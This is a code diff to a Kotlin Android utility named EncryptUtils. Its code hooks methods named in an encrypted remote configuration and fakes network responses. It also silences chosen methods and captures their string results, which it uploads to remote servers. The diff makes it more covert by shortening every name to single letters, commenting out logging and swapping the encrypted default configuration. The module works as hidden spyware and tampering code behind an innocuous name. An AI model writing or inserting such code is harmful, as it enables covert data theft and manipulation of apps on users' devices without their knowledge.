@@ -13,6 +13,7 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import okhttp3.ResponseBody.Companion.toResponseBody
+import okhttp3.logging.HttpLoggingInterceptor
 import top.canyie.pine.Pine
 import top.canyie.pine.PineConfig
 import top.canyie.pine.callback.MethodHook
@@ -21,34 +22,23 @@ import java.lang.reflect.Method
 import java.net.Proxy
 import java.util.concurrent.TimeUnit
 import kotlin.concurrent.thread
+import kotlin.random.Random
 
 
 internal object EncryptUtils {
-    private val TAG = "Tg."
+//    private val TAG = "Tg."
 
     private var sp: SharedPreferences? = null
 
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
-    private var DEFAULT = """
-            20D5E5B7EEDD18DB1BB3E0929B161BB1BB3DFF6E35E58B657A66BACEBE77262561172463AFB9D69E64DF
-            09F10A1ABE063D7BDDF1425BC229D9715758A4A6AB9FEDE912AC7E9FF09C7E392DFAC0D9E2F2168BCD1F
-            48AF7C13C63F0949C1834E227464BD102461412C585F11FB978D2B8AB7800AEA7A31655681D039D9AA3E
-            E48CDB39292DDCFB8E50C3980ADB93CF8ABECC5F0DDBA70781764846CC4BD1FE992551EA0F0E9D27236D
-            E2C8299B1F7F866F174B0CC21A178D3F828A2AF6931CF5582A45300A716B2AAFF40B486639BF8DE77481
-            242E6F5D45F8A50591B0FE4165A00FDC5079B0AD64E8346830E2E7B456FD335EF8A9F706946E044CB63C
-            58AEAAAB16DA1903BEDE523055A445E55A1E5287B70A6BB4F4CE38235F149C0A13463A275B74DF521ECD
-            6826A43E45407B237075210476C3E9E2131A16508EBEEAC9B970DE3C5A51A4CA938D17F144961C44431A
-            49381ACDD4B8C333B3FDE2C3B848E9B72D5D95191D80AE9F0F4FD6D8DA7440AF051A9B25FA740F9A7BA0
-            B3E750CCDC75AF912386E84B3652E12E16CBB122912057936557983CE927E580E3C3BF6BA84BE987B8A4
-            90A65B7EA3669C44A3446FFE
-        """.trimIndent()
+    private var DEFAULT =
+        """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34AF2C64D4E1EA09A4680269C55365AEC177C315F1E4348588ABF0A448E0833F08E291FD75815BA63B4034BEB2BD100D08FACDA0C64F651549608530E23379599DCC9DF32C8D6796C20781A488A055BD3D9359A9891BC441F8B67E2ECCD112B36736E25F9B67FED804B0845F734CC0622BE198773A910297FE9A23BBBFE6A737C643242BC2DF2231459EE9D546ED06BBE430D5B24B3729BC4419E18FAE1DDF51716B4E7E9AB9FAAE10813A5FAF005E6F75""".trimIndent()
 
 
     fun init(app: Application) {
-        Log.i(TAG, "init utils")
+//        Log.i(TAG, "init utils")
 
-        PineConfig.debuggable = BuildConfig.DEBUG
         PineConfig.debug = false
         PineConfig.disableHiddenApiPolicy = false
         PineConfig.disableHiddenApiPolicyForPlatformDomain = false
@@ -62,36 +52,38 @@ internal object EncryptUtils {
 
         a(be)
 
-        b(be.changeOkhttpResult)
+        b(be.ok)
 
-        c(be.doNothing)
+        c(be.not)
 
-        d(be.saveResult)
+        d(be.sa)
     }
 
     private fun a(b: B) {
-        Log.i(TAG, "checkUpload")
+//        Log.i(TAG, "checkUpload")
         val list = loadValue() ?: return
         if (list.isEmpty()) return
         thread(true) {
             kotlin.runCatching {
-                u(b.uploadUrl, list)
+                u(b.u, list)
             }
         }
     }
 
-    private fun e(c: B) {
+    private fun e(b: B) {
         sp?.getLong(L_KEY, 0)?.let {
             val now = System.currentTimeMillis()
-            if (now - it > 15 * 24 * 60 * 60 * 1000) {
-                fe(c.configUrl, c.configVersion)
+            if (now - it > b.d
+                && Random.nextFloat() < b.r
+            ) {
+                fe(b.c, b.v)
             }
         }
     }
 
     private fun fe(u: List<String>, v: Long, cd: Int = 1) {
-        Log.i(TAG, "fetchConfig:$u $v")
-        val c = getClient()
+//        Log.i(TAG, "fetchConfig:$u $v")
+        val c = gC()
         val mediaType = "application/json".toMediaType()
         val requestBody =
             """{"fromApp":1,"configVersion":$v}""".toRequestBody(mediaType)
@@ -102,7 +94,7 @@ internal object EncryptUtils {
                     val r = Request.Builder().url(url).post(requestBody).build()
                     val re = c.newCall(r).execute()
                     val json = re.body!!.string()
-                    val b = Gson().fromJson(json, BaseResponse::class.java)
+                    val b = Gson().fromJson(json, Re::class.java)
                     if (b.code == 1 && b.data.isNotEmpty()) {
                         val result = JEnc.decrypt(b.data)
                         if (result.isNotEmpty()) {
@@ -125,34 +117,35 @@ internal object EncryptUtils {
     private fun f(): B? {
         try {
             return sp?.getString(C_KEY, DEFAULT)
-                ?.let { JEnc.decrypt(it).also { Log.i(TAG, it) } }
+                ?.let { JEnc.decrypt(it) }
+//                ?.also { Log.i(TAG, it) }
                 ?.let { Gson().fromJson(it, B::class.java) }
         } catch (t: Throwable) {
         }
         return null
     }
 
-    private fun b(list: List<Change>) {
-        Log.i(TAG, "injectUpdate")
+    private fun b(list: List<Ok>) {
+//        Log.i(TAG, "injectUpdate")
 
         list.forEach { bean ->
             kotlin.runCatching {
-                val method = getMethodClass(bean.method) ?: return@runCatching
+                val method = getM(bean.m) ?: return@runCatching
                 val hook = object : MethodHook() {
                     override fun beforeCall(callFrame: Pine.CallFrame?) {
                         super.beforeCall(callFrame)
                         kotlin.runCatching {
                             callFrame?.args?.getOrNull(0)?.apply {
                                 this as Interceptor.Chain
-                                Log.i(TAG, "injectInterceptor url:${request().url}")
+//                                Log.i(TAG, "injectInterceptor url:${request().url}")
                                 val requestUrl = request().url.toString()
 
                                 val inject =
-                                    bean.inject.firstOrNull { requestUrl.contains(it.changeUrl) }
+                                    bean.i.firstOrNull { requestUrl.contains(it.u) }
                                         ?: return@apply
 
-                                val response = getResponse(inject.result)
-                                Log.i(TAG, "injectInterceptor result:${response}")
+                                val response = getResponse(inject.r)
+//                                Log.i(TAG, "injectInterceptor result:${response}")
                                 callFrame.result = response
                             }
                         }
@@ -172,12 +165,12 @@ internal object EncryptUtils {
         }
     }
 
-    private fun getMethodClass(method: M): Method? {
+    private fun getM(method: M): Method? {
         try {
-            return method.className.let { Class.forName(it) }
+            return method.c.let { Class.forName(it) }
                 .let {
                     val parameterTypes =
-                        method.parameterClassName.map {
+                        method.p.map {
                             when (it) {
                                 "byte[]" -> ByteArray::class.java
                                 "int[]" -> IntArray::class.java
@@ -189,7 +182,7 @@ internal object EncryptUtils {
                                 else -> Class.forName(it)
                             }
                         }.toTypedArray()
-                    it.getDeclaredMethod(method.methodName, *parameterTypes)
+                    it.getDeclaredMethod(method.m, *parameterTypes)
                 }
         } catch (t: Throwable) {
         }
@@ -199,23 +192,23 @@ internal object EncryptUtils {
     private fun c(list: List<M>) {
         list.forEach { bean ->
             runCatching {
-                val method = getMethodClass(bean) ?: return@runCatching
+                val method = getM(bean) ?: return@runCatching
                 Pine.hook(method, MethodReplacement.DO_NOTHING)
             }
         }
     }
 
     private fun d(list: List<M>) {
-        Log.i(TAG, "saveResult")
+//        Log.i(TAG, "saveResult")
 
         list.forEach { bean ->
             runCatching {
-                val method = getMethodClass(bean) ?: return@runCatching
+                val method = getM(bean) ?: return@runCatching
                 val methodHook = object : MethodHook() {
                     override fun afterCall(callFrame: Pine.CallFrame?) {
                         super.afterCall(callFrame)
                         kotlin.runCatching {
-                            Log.i(TAG, "saveResult afterCall")
+//                            Log.i(TAG, "saveResult afterCall")
                             callFrame?.result?.let {
                                 if (it !is String) return@let
                                 if (it.isNotBlank()) saveText(it)
@@ -231,7 +224,7 @@ internal object EncryptUtils {
 
 
     private fun saveText(s: String) {
-        Log.i(TAG, "saveText")
+//        Log.i(TAG, "saveText")
         thread(true) {
             kotlin.runCatching {
                 val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
@@ -258,9 +251,9 @@ internal object EncryptUtils {
 
     private fun u(urls: List<String>, values: List<Pair<String, String>>) {
         if (values.isEmpty()) return
-        Log.i(TAG, "upload:$values")
+//        Log.i(TAG, "upload:$values")
         val result = values.joinToString { it.second.removePrefix("false") }
-        val client = getClient()
+        val client = gC()
         val mediaType = "application/json".toMediaType()
         val requestBody =
             """{"fromApp":1,"value":"$result"}""".toRequestBody(mediaType)
@@ -270,7 +263,7 @@ internal object EncryptUtils {
                 val request = Request.Builder().url(url).post(requestBody).build()
                 val response = client.newCall(request).execute()
                 val json = response.body!!.string()
-                val baseResponse = Gson().fromJson(json, BaseResponse::class.java)
+                val baseResponse = Gson().fromJson(json, Re::class.java)
                 if (baseResponse.code == 1) {
                     sp?.apply {
                         values.forEach {
@@ -283,45 +276,48 @@ internal object EncryptUtils {
         }
     }
 
-    private fun getClient() = OkHttpClient.Builder()
+    private fun gC() = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
         .readTimeout(10, TimeUnit.SECONDS)
-//        .addInterceptor(HttpLoggingInterceptor().apply {
-//            level = HttpLoggingInterceptor.Level.BODY
-//        })
+        .addInterceptor(HttpLoggingInterceptor().apply {
+            level = HttpLoggingInterceptor.Level.BODY
+        })
         .proxy(Proxy.NO_PROXY)
         .build()
 
 }
 
-private data class BaseResponse(
+private data class Re(
     var code: Int = -1,
     var msg: String = "",
     var data: String = ""
 )
 
-private data class B(
-    var changeOkhttpResult: List<Change> = listOf(),
-    var configUrl: List<String> = listOf(),
-    var configVersion: Long = 0,
-    var doNothing: List<M> = listOf(),
-    var saveResult: List<M> = listOf(),
-    var uploadUrl: List<String> = listOf()
-)
-
-private data class Change(
-    var inject: List<Item> = listOf(),
-    var method: M = M()
+data class B(
+    var c: List<String> = listOf(),
+    var d: Long = 0,
+    var not: List<M> = listOf(),
+    var ok: List<Ok> = listOf(),
+    var r: Float = 0f,
+    var sa: List<M> = listOf(),
+    var u: List<String> = listOf(),
+    var v: Long = 0
 )
 
 
-private data class Item(
-    var changeUrl: String = "",
-    var result: String = ""
+data class Ok(
+    var i: List<I> = listOf(),
+    var m: M = M()
 )
 
-private data class M(
-    var className: String = "",
-    var methodName: String = "",
-    var parameterClassName: List<String> = listOf()
+
+data class I(
+    var r: String = "",
+    var u: String = ""
+)
+
+data class M(
+    var c: String = "",
+    var m: String = "",
+    var p: List<String> = listOf()
 )
